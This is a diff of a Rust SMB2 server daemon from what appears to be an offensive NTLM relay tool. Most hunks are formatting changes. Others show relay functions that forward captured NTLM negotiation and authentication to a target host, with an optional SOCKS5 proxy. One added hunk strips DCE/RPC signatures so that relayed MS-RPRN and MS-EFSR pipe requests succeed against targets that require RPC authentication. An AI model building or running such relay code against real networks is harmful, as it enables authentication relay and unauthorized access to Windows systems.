@@ -1,4 +1,4 @@
-﻿//! Full SMB2 protocol server daemon.
+//! Full SMB2 protocol server daemon.
 //!
 //! Listens on port 445 and handles the full SMB2 protocol:
 //! - Negotiate (SMB 2.0.2 through 3.1.1) with pre-auth integrity
@@ -74,7 +74,8 @@ const FILE_OPEN: u32 = 0x0001;
 /// Safely read a u16 from a byte slice at the given offset.
 /// Returns None if the slice is too short.
 fn read_u16_le(data: &[u8], offset: usize) -> Option<u16> {
-    data.get(offset..offset + 2).map(|b| u16::from_le_bytes([b[0], b[1]]))
+    data.get(offset..offset + 2)
+        .map(|b| u16::from_le_bytes([b[0], b[1]]))
 }
 
 /// Safely read a u32 from a byte slice at the given offset.
@@ -630,13 +631,13 @@ impl SmbDaemon {
                 } = &config.mode
                 {
                     match Self::relay_negotiate_and_type1(
-                            target_host,
-                            *target_port,
-                            session,
-                            data,
-                            config.socks5_proxy.as_deref(),
-                        )
-                        .await
+                        target_host,
+                        *target_port,
+                        session,
+                        data,
+                        config.socks5_proxy.as_deref(),
+                    )
+                    .await
                     {
                         Ok((challenge_blob, relay_sess)) => {
                             session.relay_session = Some(relay_sess);
@@ -1083,7 +1084,9 @@ impl SmbDaemon {
 
         let target_session_id = match read_u64_le(&target_data[smb2_start..], 44) {
             Some(id) => id,
-            None => return Err(RelayError::Config("Short relay response (session id)".into()).into()),
+            None => {
+                return Err(RelayError::Config("Short relay response (session id)".into()).into());
+            }
         };
 
         let relay_sess = SmbRelaySession {
@@ -1134,7 +1137,11 @@ impl SmbDaemon {
         }
         let target_status = match read_u32_le(&target_data[smb2_start..], 8) {
             Some(s) => s,
-            None => return Err(RelayError::Config("Short relay auth3 response (status)".into()).into()),
+            None => {
+                return Err(
+                    RelayError::Config("Short relay auth3 response (status)".into()).into(),
+                );
+            }
         };
         if target_status != STATUS_SUCCESS {
             return Err(RelayError::Config(format!(
@@ -1146,7 +1153,11 @@ impl SmbDaemon {
 
         let target_session_id = match read_u64_le(&target_data[smb2_start..], 44) {
             Some(id) => id,
-            None => return Err(RelayError::Config("Short relay auth3 response (session id)".into()).into()),
+            None => {
+                return Err(
+                    RelayError::Config("Short relay auth3 response (session id)".into()).into(),
+                );
+            }
         };
 
         // Extract session key from the target's response security buffer
@@ -1265,8 +1276,15 @@ impl SmbDaemon {
         dce_input: &[u8],
         max_output: u32,
     ) -> (u32, Vec<u8>) {
+        // Strip DCE/RPC authentication verifier (signature) before forwarding to target.
+        // When relaying NTLM through DCE/RPC pipes (MS-RPRN, MS-EFSR, etc.), the signature
+        // in the auth verifier becomes invalid if the relay modified the challenge. Stripping
+        // it allows the relayed request to succeed even when the target requires RPC auth.
+        let cleaned_input = overthrone_core::proto::ntlm::strip_dce_rpc_signature(dce_input);
+
         let file_id = relay.file_id.unwrap_or([0u8; 16]);
-        let body = Self::build_ioctl_body(FSCTL_PIPE_TRANSCEIVE, &file_id, dce_input, max_output);
+        let body =
+            Self::build_ioctl_body(FSCTL_PIPE_TRANSCEIVE, &file_id, &cleaned_input, max_output);
         let pkt = Self::build_relay_request(
             relay.message_id,
             relay.session_id,
